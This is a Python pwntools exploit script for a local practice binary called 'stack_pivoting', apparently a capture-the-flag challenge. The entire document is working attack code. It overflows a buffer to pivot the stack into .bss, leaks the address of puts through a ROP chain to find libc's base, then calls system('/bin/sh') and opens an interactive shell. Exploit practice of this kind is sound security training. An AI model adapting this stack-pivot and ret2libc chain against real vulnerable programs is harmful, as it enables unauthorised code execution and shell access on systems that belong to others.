from pwn import *
context.log_level = 'debug'

p = process('./stack_pivoting')
elf = ELF('./stack_pivoting')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

vuln = elf.sym['vuln']
bss = elf.bss() + 0x700

pop_rdi = 0x0000000000400773
leave_ret = 0x00000000004006db
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

vuln_read_leave_ret = 0x4006C4
pop_rbp_ret = 0x00000000004005b0
ret = 0x0000000000400506

p.recvuntil(b"Stack_Pivoting?")
payload = b'a' * 0x30 + p64(bss + 0x20) + p64(vuln_read_leave_ret)
p.send(payload)

payload = p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(pop_rbp_ret) + p64(bss + 0x48) + p64(vuln_read_leave_ret)
payload += p64(bss - 0x18) + p64(leave_ret)
p.send(payload)

leak = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
log.info("leak: "+hex(leak))

libc_base = leak - libc.sym['puts']
system = libc_base + libc.sym['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))
payload = p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system)
p.sendline(payload)

p.interactive()